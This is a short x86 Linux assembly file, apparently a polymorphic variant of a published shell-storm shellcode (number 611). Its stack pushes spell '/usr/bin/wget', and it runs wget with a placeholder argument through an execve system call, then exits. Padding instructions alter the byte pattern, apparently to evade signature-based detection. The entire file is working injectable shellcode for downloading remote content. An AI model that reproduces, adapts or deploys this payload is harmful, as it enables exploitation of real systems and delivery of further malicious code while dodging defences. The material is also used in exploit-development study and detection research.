; http://shell-storm.org/shellcode/files/shellcode-611.php
; original: 42
; poly: 53

global _start

section .text
_start:
  inc esp
  inc ebp
  cdq

  dec    esp
  dec    ebp
  push   edx
  push   0x61616161
  inc    edx
  mov    ecx,esp
  dec    edx
  push   edx

  push   0x74
  push   0x6567772f
  push   0x6e69622f
  push   0x7273752f
  mov    ebx,esp

  push   edx
  push   ecx
  pushad
  popad
  push   ebx
  mov    ecx,esp
  push   0xb
  pop    eax
  int    0x80

  add    al, 0x2
  dec    al
  int    0x80
